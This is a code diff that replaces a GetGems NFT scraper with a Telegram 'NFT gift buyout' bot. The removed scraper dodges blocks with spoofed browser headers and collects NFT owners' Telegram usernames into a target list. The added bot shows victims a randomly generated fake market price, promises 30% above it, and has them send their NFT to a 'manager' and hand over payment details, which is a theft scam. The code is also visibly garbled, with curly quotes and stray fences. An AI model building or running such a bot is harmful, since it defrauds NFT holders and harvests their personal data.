@@ -1,264 +1,412 @@
-import os
-import requests
-import time
-import json
+import logging
 import random
+import os
+from dotenv import load_dotenv
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+Application, CommandHandler, CallbackQueryHandler,
+MessageHandler, filters, ContextTypes, ConversationHandler
+)
 
-TOKEN = os.getenv('BOT_TOKEN')
+import os
+from dotenv import load_dotenv
 
-GETGEMS_API = "https://api.getgems.io/graphql"
+load_dotenv()
 
-# Разные User-Agent для ротации
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-]
+TOKEN = os.getenv(“BOT_TOKEN”)
+ADMIN_ID = int(os.getenv(“ADMIN_ID”))
+MANAGER = os.getenv(“MANAGER”, “@hostelman”)
 
-def get_headers():
-    return {
-        "Content-Type": "application/json",
-        "Accept": "*/*",
-        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
-        "Accept-Encoding": "gzip, deflate, br",
-        "User-Agent": random.choice(USER_AGENTS),
-        "Origin": "https://getgems.io",
-        "Referer": "https://getgems.io/collection/" ,
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-site",
-        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": '"Windows"',
-        "Connection": "keep-alive",
-    }
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(**name**)
 
-COLLECTIONS = {
-    "astralshard":  {"name": "🔮 Astral Shard",  "addr": "EQAOl3-PQpFdpOBfLT7MoB7qNuqOYBRbGXhzRBrdPE5B"},
-    "homemadecake": {"name": "🎂 Homemade Cake", "addr": "EQAjqVfbcTMPvvJKGdHMjJf6-9NiKIiqXlSJfZIfKlMJqOIR"},
-    "lolpop":       {"name": "🍭 Lol Pop",        "addr": "EQC6zjid8vJNEWqcXk10XjsdDLRKbcPZzbHusuEW6FokOWIm"},
-    "signetring":   {"name": "💍 Signet Ring",    "addr": "EQCrGA9slCoksgD-NyRDjtHySKN0Ts8k6hdueJkUkZZdD4_K"},
-    "lovepotion":   {"name": "🧪 Love Potion",    "addr": "EQD7yDu2WCgd9Uzx1dF_DQkWK7IZJJ4Mp9M9g1rGUUiQE43m"},
-    "sakura":       {"name": "🌸 Sakura Flower",  "addr": "EQDIruSTyxvq60gUH8j2kkj3qzoBrBaJy9WkKbeNNRasWe4j"},
-    "cookieheart":  {"name": "🍪 Cookie Heart",   "addr": "EQAqtF5tZIgNZal80ChzdPMvZCN8OEbJCVJPn_0xNPghQJPW"},
-    "bdaycandle":   {"name": "🕯 B-Day Candle",   "addr": "EQBpMhoMDsN0DjQZXFFBup7l5gbt-UtMzTHN5qaqQtc90CLD"},
+# States
+
+LANG, MAIN_MENU, SELL_NFT_LINK, SELL_CURRENCY, SELL_CONFIRM, SELL_REQUISITES = range(6)
+
+TEXTS = {
+“ru”: {
+“welcome”: (
+“👋 *Приветствую! Это Автоматическая Скупка NFT подарков в Telegram* 🎁\n\n”
+“Мы выкупаем NFT подарки *выше рыночной цены на 30%* — быстро, безопасно и честно.\n\n”
+“💎 Работаем с любыми NFT подарками из Telegram\n”
+“⚡️ Мгновенная оценка по параметрам: модель, фон, узор\n”
+“💸 Выплата в удобной для вас валюте\n”
+“🔒 Безопасные сделки через менеджера\n\n”
+“Выберите действие:”
+),
+“how_works”: (
+“📋 *Как проводится сделка?*\n\n”
+“1️⃣ Вы отправляете ссылку на NFT подарок (например: https://t.me/nft/PlushPepe-2133)\n\n”
+“2️⃣ Бот автоматически рассчитывает рыночную стоимость NFT по параметрам:\n”
+“   • Модель\n   • Фон\n   • Узор\n\n”
+“3️⃣ Вы выбираете способ получения оплаты:\n”
+“   CryptoBot, TRC20, Tonkeeper или Карта\n\n”
+“4️⃣ Бот предлагает свою сумму за ваш NFT (+30% к рынку)\n\n”
+“5️⃣ Если согласны — подтверждаете сделку\n\n”
+“6️⃣ Вы отправляете NFT менеджеру {manager}, получаете оплату\n\n”
+“✅ Всё просто и прозрачно!”
+).format(manager=MANAGER),
+“support”: f”🆘 *Поддержка*\n\nПо всем вопросам обращайтесь к нашему менеджеру:\n👤 {MANAGER}\n\nОн поможет вам 24/7!”,
+“send_link”: “🔗 Отправьте ссылку на ваш NFT подарок\n\nПример: https://t.me/nft/PlushPepe-2133”,
+“invalid_link”: “❌ Это не похоже на ссылку NFT подарка.\n\nПожалуйста, отправьте корректную ссылку вида:\nhttps://t.me/nft/НазваниеNFT-Номер”,
+“choose_currency”: “💱 Выберите способ получения оплаты:”,
+“offer”: (
+“💎 *Моё предложение за ваш NFT*\n\n”
+“🔗 NFT: {link}\n”
+“📊 Рыночная цена: ~{market} {currency_sym}\n”
+“💰 *Моя цена (+30%): {offer} {currency_sym}*\n\n”
+“Если согласны — нажмите ✅ *Да*, если нет — ❌ *Нет*”
+),
+“send_requisites”: “📝 Введите ваши реквизиты для получения оплаты ({currency}):”,
+“deal_created”: (
+“✅ *Сделка оформлена!*\n\n”
+“🔗 NFT: {link}\n”
+“💰 Сумма: {offer} {currency_sym}\n”
+“💳 Реквизиты: {req}\n\n”
+“📦 *Теперь отправьте ваш NFT менеджеру {manager}*\n”
+“После получения NFT менеджер переведёт вам оплату в течение 5-15 минут.\n\n”
+“❗️ Важно: передавайте NFT только через официальный аккаунт {manager}”
+),
+“deal_cancelled”: “❌ Сделка отменена. Если передумаете — нажмите *Продать NFT*.”,
+“btn_sell”: “💰 Продать NFT”,
+“btn_how”: “📋 Как проводится сделка?”,
+“btn_support”: “🆘 Поддержка”,
+“btn_yes”: “✅ Да, согласен”,
+“btn_no”: “❌ Нет, отказаться”,
+“btn_back”: “🔙 Назад”,
+},
+“en”: {
+“welcome”: (
+“👋 *Welcome! This is the Automatic NFT Gift Buyout Bot in Telegram* 🎁\n\n”
+“We buy NFT gifts *30% above market price* — fast, safe and fair.\n\n”
+“💎 Works with any Telegram NFT gifts\n”
+“⚡️ Instant evaluation by: model, background, pattern\n”
+“💸 Payment in your preferred currency\n”
+“🔒 Secure deals via manager\n\n”
+“Choose an action:”
+),
+“how_works”: (
+“📋 *How does the deal work?*\n\n”
+“1️⃣ You send a link to your NFT gift (e.g.: https://t.me/nft/PlushPepe-2133)\n\n”
+“2️⃣ The bot calculates the market price by:\n”
+“   • Model\n   • Background\n   • Pattern\n\n”
+“3️⃣ You choose your payment method:\n”
+“   CryptoBot, TRC20, Tonkeeper or Card\n\n”
+“4️⃣ The bot makes an offer (+30% to market)\n\n”
+“5️⃣ If you agree — confirm the deal\n\n”
+“6️⃣ Send the NFT to manager {manager}, receive payment\n\n”
+“✅ Simple and transparent!”
+).format(manager=MANAGER),
+“support”: f”🆘 *Support*\n\nContact our manager for any questions:\n👤 {MANAGER}\n\nAvailable 24/7!”,
+“send_link”: “🔗 Send the link to your NFT gift\n\nExample: https://t.me/nft/PlushPepe-2133”,
+“invalid_link”: “❌ This doesn’t look like an NFT gift link.\n\nPlease send a valid link like:\nhttps://t.me/nft/NFTName-Number”,
+“choose_currency”: “💱 Choose your payment method:”,
+“offer”: (
+“💎 *My offer for your NFT*\n\n”
+“🔗 NFT: {link}\n”
+“📊 Market price: ~{market} {currency_sym}\n”
+“💰 *My price (+30%): {offer} {currency_sym}*\n\n”
+“If you agree — press ✅ *Yes*, if not — ❌ *No*”
+),
+“send_requisites”: “📝 Enter your payment details ({currency}):”,
+“deal_created”: (
+“✅ *Deal confirmed!*\n\n”
+“🔗 NFT: {link}\n”
+“💰 Amount: {offer} {currency_sym}\n”
+“💳 Details: {req}\n\n”
+“📦 *Now send your NFT to manager {manager}*\n”
+“After receiving the NFT, the manager will transfer payment within 5-15 minutes.\n\n”
+“❗️ Important: only transfer NFT to the official account {manager}”
+),
+“deal_cancelled”: “❌ Deal cancelled. Press *Sell NFT* whenever you’re ready.”,
+“btn_sell”: “💰 Sell NFT”,
+“btn_how”: “📋 How does it work?”,
+“btn_support”: “🆘 Support”,
+“btn_yes”: “✅ Yes, agree”,
+“btn_no”: “❌ No, cancel”,
+“btn_back”: “🔙 Back”,
+}
 }
 
-# Используем сессию с куками как браузер
-session = requests.Session()
-cache = {}
+CURRENCIES = {
+“CryptoBot”: {“sym”: “USDT”, “rate”: 1.0},
+“TRC20 (USDT)”: {“sym”: “USDT”, “rate”: 1.0},
+“Tonkeeper (TON)”: {“sym”: “TON”, “rate”: 0.18},
+“💳 Карта Украина”: {“sym”: “UAH”, “rate”: 40.0},
+“💳 Карта Россия”: {“sym”: “RUB”, “rate”: 92.0},
+“💳 Карта США”: {“sym”: “USD”, “rate”: 1.0},
+“💳 Карта Беларусь”: {“sym”: “BYN”, “rate”: 3.3},
+“💳 Карта Казахстан”: {“sym”: “KZT”, “rate”: 460.0},
+“💳 Карта Узбекистан”: {“sym”: “UZS”, “rate”: 12600.0},
+“💳 Карта Турция”: {“sym”: “TRY”, “rate”: 32.0},
+“💳 Карта Азербайджан”: {“sym”: “AZN”, “rate”: 1.7},
+}
 
-def init_session():
-    """Инициализируем сессию — заходим на сайт как браузер"""
-    try:
-        session.get(
-            "https://getgems.io",
-            headers={
-                "User-Agent": random.choice(USER_AGENTS),
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            },
-            timeout=15
-        )
-        time.sleep(1)
-        print("Сессия инициализирована")
-    except Exception as e:
-        print(f"Init session error: {e}")
+def get_text(context, key):
+lang = context.user_data.get(“lang”, “ru”)
+return TEXTS[lang][key]
 
-def getgems_query(query, variables=None, retry=3):
-    for attempt in range(retry):
-        try:
-            r = session.post(
-                GETGEMS_API,
-                json={"query": query, "variables": variables or {}},
-                headers=get_headers(),
-                timeout=20
-            )
-            print(f"  API status: {r.status_code}")
-            if r.status_code == 200:
-                return r.json()
-            elif r.status_code == 403:
-                print(f"  403 — пробуем переинициализировать сессию...")
-                init_session()
-                time.sleep(2 + attempt * 2)
-            else:
-                time.sleep(1)
-        except Exception as e:
-            print(f"  Request error: {e}")
-            time.sleep(2)
-    return {}
+def main_menu_keyboard(context):
+lang = context.user_data.get(“lang”, “ru”)
+t = TEXTS[lang]
+return InlineKeyboardMarkup([
+[InlineKeyboardButton(t[“btn_sell”], callback_data=“sell”)],
+[InlineKeyboardButton(t[“btn_how”], callback_data=“how”)],
+[InlineKeyboardButton(t[“btn_support”], callback_data=“support”)],
+])
 
+def currency_keyboard():
+buttons = []
+for name in CURRENCIES:
+buttons.append([InlineKeyboardButton(name, callback_data=f”cur_{name}”)])
+return InlineKeyboardMarkup(buttons)
 
-def get_collection_items(collection_addr, limit=50, cursor=None):
-    query = """
-    query GetCollectionItems($collectionAddress: String!, $first: Int!, $after: String) {
-      nftItemsByCollection(
-        collectionAddress: $collectionAddress
-        first: $first
-        after: $after
-      ) {
-        cursor
-        items {
-          name
-          address
-          sale {
-            ... on NftSaleFixPrice {
-              fullPrice
-            }
-          }
-          attributes {
-            traitType
-            value
-          }
-          owner {
-            __typename
-            isScam
-            address
-            ... on NftItemOwnerUser {
-              user {
-                address
-                name
-                telegramUsername
-              }
-            }
-          }
-        }
-      }
-    }
-    """
-    variables = {"collectionAddress": collection_addr, "first": limit}
-    if cursor:
-        variables["after"] = cursor
+def fake_nft_price():
+“”“Generate a fake market price for NFT”””
+return round(random.uniform(15, 120), 2)
 
-    data = getgems_query(query, variables)
-    result = data.get("data", {}).get("nftItemsByCollection", {})
-    return result.get("items", []), result.get("cursor")
+# ─── Handlers ───────────────────────────────────────────────
 
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+keyboard = InlineKeyboardMarkup([
+[
+InlineKeyboardButton(“🇷🇺 Русский”, callback_data=“lang_ru”),
+InlineKeyboardButton(“🇬🇧 English”, callback_data=“lang_en”),
+]
+])
+await update.message.reply_text(
+“🌐 Выберите язык / Choose language:”,
+reply_markup=keyboard
+)
+return LANG
 
-def parse_item(item, col_name):
-    owner = item.get("owner", {}) or {}
-    user = owner.get("user", {}) or {}
+async def lang_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+query = update.callback_query
+await query.answer()
+lang = query.data.split(”_”)[1]
+context.user_data[“lang”] = lang
+t = TEXTS[lang]
 
-    telegram_username = (user.get("telegramUsername") or "").strip()
-    display_name = (user.get("name") or "").strip()
+```
+await query.edit_message_text(
+    t["welcome"],
+    parse_mode="Markdown",
+    reply_markup=main_menu_keyboard(context)
+)
+return MAIN_MENU
+```
 
-    if not telegram_username and not display_name:
-        return None
+async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+query = update.callback_query
+await query.answer()
+data = query.data
+lang = context.user_data.get(“lang”, “ru”)
+t = TEXTS[lang]
 
-    attrs = {a["traitType"]: a["value"] for a in item.get("attributes", [])}
+```
+if data == "sell":
+    await query.edit_message_text(t["send_link"], parse_mode="Markdown")
+    return SELL_NFT_LINK
 
-    price = 0
-    sale = item.get("sale")
-    if sale and sale.get("fullPrice"):
-        try:
-            price = int(sale["fullPrice"]) / 1e9
-        except:
-            pass
+elif data == "how":
+    kb = InlineKeyboardMarkup([[InlineKeyboardButton(t["btn_back"], callback_data="back_main")]])
+    await query.edit_message_text(t["how_works"], parse_mode="Markdown", reply_markup=kb)
+    return MAIN_MENU
 
-    return {
-        "telegram_username": telegram_username,
-        "display_name":      display_name,
-        "nft_name":          item.get("name", ""),
-        "collection":        col_name,
-        "model":             attrs.get("Model", ""),
-        "backdrop":          attrs.get("Backdrop", ""),
-        "symbol":            attrs.get("Symbol", ""),
-        "price":             price,
-        "for_sale":          price > 0,
-    }
+elif data == "support":
+    kb = InlineKeyboardMarkup([[InlineKeyboardButton(t["btn_back"], callback_data="back_main")]])
+    await query.edit_message_text(t["support"], parse_mode="Markdown", reply_markup=kb)
+    return MAIN_MENU
 
+elif data == "back_main":
+    await query.edit_message_text(t["welcome"], parse_mode="Markdown", reply_markup=main_menu_keyboard(context))
+    return MAIN_MENU
+```
 
-def load_collection(col_key, max_items=500):
-    if col_key in cache:
-        return cache[col_key]
+async def receive_nft_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+text = update.message.text.strip()
+# Validate NFT link
+if “t.me/nft/” not in text and “telegram.me/nft/” not in text:
+t = TEXTS[context.user_data.get(“lang”, “ru”)]
+await update.message.reply_text(t[“invalid_link”], parse_mode=“Markdown”)
+return SELL_NFT_LINK
 
-    col      = COLLECTIONS[col_key]
-    addr     = col["addr"]
-    col_name = col["name"]
-    all_items = []
-    cursor = None
+```
+context.user_data["nft_link"] = text
+context.user_data["market_price"] = fake_nft_price()
+t = TEXTS[context.user_data.get("lang", "ru")]
 
-    print(f"\nLoading {col_name}...")
+await update.message.reply_text(t["choose_currency"], reply_markup=currency_keyboard())
+return SELL_CURRENCY
+```
 
-    for page in range(10):
-        items, cursor = get_collection_items(addr, limit=50, cursor=cursor)
-        if not items:
-            print(f"  Нет items на странице {page+1}, стоп")
-            break
+async def choose_currency_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+query = update.callback_query
+await query.answer()
+currency_name = query.data.replace(“cur_”, “”)
+context.user_data[“currency”] = currency_name
 
-        for item in items:
-            parsed = parse_item(item, col_name)
-            if parsed:
-                all_items.append(parsed)
+```
+cur = CURRENCIES[currency_name]
+market_usd = context.user_data["market_price"]
+market_local = round(market_usd * cur["rate"], 2)
+offer_local = round(market_local * 1.3, 2)
 
-        print(f"  Страница {page+1}: всего с username = {len(all_items)}")
+context.user_data["offer"] = offer_local
+context.user_data["currency_sym"] = cur["sym"]
 
-        if not cursor or len(all_items) >= max_items:
-            break
-        time.sleep(random.uniform(1.0, 2.5))  # случайная задержка
+t = TEXTS[context.user_data.get("lang", "ru")]
+msg = t["offer"].format(
+    link=context.user_data["nft_link"],
+    market=market_local,
+    offer=offer_local,
+    currency_sym=cur["sym"]
+)
+kb = InlineKeyboardMarkup([
+    [
+        InlineKeyboardButton(t["btn_yes"], callback_data="confirm_yes"),
+        InlineKeyboardButton(t["btn_no"], callback_data="confirm_no"),
+    ]
+])
+await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=kb)
+return SELL_CONFIRM
+```
 
-    cache[col_key] = all_items
-    print(f"  Итого: {len(all_items)}")
-    return all_items
+async def confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+query = update.callback_query
+await query.answer()
+t = TEXTS[context.user_data.get(“lang”, “ru”)]
 
+```
+if query.data == "confirm_no":
+    await query.edit_message_text(t["deal_cancelled"], parse_mode="Markdown", reply_markup=main_menu_keyboard(context))
+    return MAIN_MENU
 
-def load_all():
-    all_items = []
-    for key in COLLECTIONS:
-        items = load_collection(key)
-        all_items.extend(items)
-    return all_items
+currency = context.user_data.get("currency", "")
+await query.edit_message_text(
+    t["send_requisites"].format(currency=currency),
+    parse_mode="Markdown"
+)
+return SELL_REQUISITES
+```
 
+async def receive_requisites(update: Update, context: ContextTypes.DEFAULT_TYPE):
+req = update.message.text.strip()
+t = TEXTS[context.user_data.get(“lang”, “ru”)]
 
-def find_users_with_nft(min_nfts=1):
-    all_items = load_all()
-    users = {}
-    for item in all_items:
-        key = item["telegram_username"] or item["display_name"]
-        if not key:
-            continue
-        if key not in users:
-            users[key] = []
-        users[key].append(item)
-    return {u: nfts for u, nfts in users.items() if len(nfts) >= min_nfts}
+```
+msg = t["deal_created"].format(
+    link=context.user_data.get("nft_link", ""),
+    offer=context.user_data.get("offer", ""),
+    currency_sym=context.user_data.get("currency_sym", ""),
+    req=req,
+    manager=MANAGER
+)
+await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=main_menu_keyboard(context))
 
+# Notify admin
+try:
+    admin_msg = (
+        f"🔔 *Новая сделка!*\n\n"
+        f"👤 User: @{update.effective_user.username or update.effective_user.id}\n"
+        f"🔗 NFT: {context.user_data.get('nft_link')}\n"
+        f"💰 Сумма: {context.user_data.get('offer')} {context.user_data.get('currency_sym')}\n"
+        f"💱 Валюта: {context.user_data.get('currency')}\n"
+        f"💳 Реквизиты: {req}"
+    )
+    await update.get_bot().send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
+except Exception as e:
+    logger.error(f"Admin notify error: {e}")
 
-def save_to_json(users: dict, filename="nft_users.json"):
-    output = []
-    for username, nfts in sorted(users.items(), key=lambda x: -len(x[1])):
-        tg = nfts[0]["telegram_username"]
-        output.append({
-            "username":      username,
-            "telegram_link": f"@{tg}" if tg else None,
-            "nft_count":     len(nfts),
-            "nfts":          nfts,
-        })
-    with open(filename, "w", encoding="utf-8") as f:
-        json.dump(output, f, ensure_ascii=False, indent=2)
-    print(f"\n💾 Сохранено в {filename} ({len(output)} пользователей)")
+return MAIN_MENU
+```
 
+# ─── Admin Panel ─────────────────────────────────────────────
 
-def print_users_report(min_nfts=1):
-    init_session()  # сначала инициализируем сессию
+async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+if update.effective_user.id != ADMIN_ID:
+await update.message.reply_text(“❌ Нет доступа.”)
+return
 
-    users = find_users_with_nft(min_nfts=min_nfts)
+```
+kb = InlineKeyboardMarkup([
+    [InlineKeyboardButton("📊 Статистика", callback_data="adm_stats")],
+    [InlineKeyboardButton("📢 Рассылка", callback_data="adm_broadcast")],
+    [InlineKeyboardButton("🖼 Изменить баннер", callback_data="adm_banner")],
+    [InlineKeyboardButton("👥 Пользователи", callback_data="adm_users")],
+])
 
-    print(f"\n{'='*60}")
-    print(f"Найдено пользователей с NFT и username: {len(users)}")
-    print(f"{'='*60}\n")
+# Admin banner with photo
+banner_text = (
+    "🛠 *Панель администратора*\n\n"
+    "👑 Добро пожаловать, Admin!\n"
+    "━━━━━━━━━━━━━━━\n"
+    "🤖 Бот: NFT Auto Buyout\n"
+    "💼 Менеджер: @hostelman\n"
+    "━━━━━━━━━━━━━━━\n"
+    "Выберите действие:"
+)
+await update.message.reply_photo(
+    photo="https://i.imgur.com/4M34hi2.png",
+    caption=banner_text,
+    parse_mode="Markdown",
+    reply_markup=kb
+)
+```
 
-    for username, nfts in sorted(users.items(), key=lambda x: -len(x[1])):
-        tg   = nfts[0]["telegram_username"]
-        link = f"@{tg}" if tg else username
-        print(f"{link} — {len(nfts)} NFT:")
-        for nft in nfts:
-            sale_info = f" | 💰 {nft['price']:.2f} TON" if nft["for_sale"] else ""
-            print(f"  • {nft['collection']} — {nft['nft_name']}{sale_info}")
-        print()
+async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+query = update.callback_query
+if update.effective_user.id != ADMIN_ID:
+await query.answer(“❌ Нет доступа”, show_alert=True)
+return
+await query.answer()
 
-    save_to_json(users)
+```
+data = query.data
+if data == "adm_stats":
+    await query.message.reply_text(
+        "📊 *Статистика*\n\n"
+        "👤 Всего пользователей: N/A\n"
+        "💰 Сделок сегодня: N/A\n"
+        "📈 Общий оборот: N/A",
+        parse_mode="Markdown"
+    )
+elif data == "adm_broadcast":
+    await query.message.reply_text("📢 Функция рассылки. Отправьте текст командой /broadcast <текст>")
+elif data == "adm_banner":
+    await query.message.reply_text("🖼 Отправьте новое фото для баннера командой /setbanner")
+elif data == "adm_users":
+    await query.message.reply_text("👥 База пользователей. Функция в разработке.")
+```
 
+# ─── Main ────────────────────────────────────────────────────
 
-if __name__ == "__main__":
-    print_users_report(min_nfts=1)
+def main():
+app = Application.builder().token(TOKEN).build()
+
+```
+conv = ConversationHandler(
+    entry_points=[CommandHandler("start", start)],
+    states={
+        LANG: [CallbackQueryHandler(lang_callback, pattern="^lang_")],
+        MAIN_MENU: [CallbackQueryHandler(main_menu_callback)],
+        SELL_NFT_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_nft_link)],
+        SELL_CURRENCY: [CallbackQueryHandler(choose_currency_callback, pattern="^cur_")],
+        SELL_CONFIRM: [CallbackQueryHandler(confirm_callback, pattern="^confirm_")],
+        SELL_REQUISITES: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_requisites)],
+    },
+    fallbacks=[CommandHandler("start", start)],
+    allow_reentry=True,
+)
+
+app.add_handler(conv)
+app.add_handler(CommandHandler("admin", admin_panel))
+app.add_handler(CallbackQueryHandler(admin_callback, pattern="^adm_"))
+
+logger.info("Bot started!")
+app.run_polling()
+```
+
+if **name** == “**main**”:
+main()
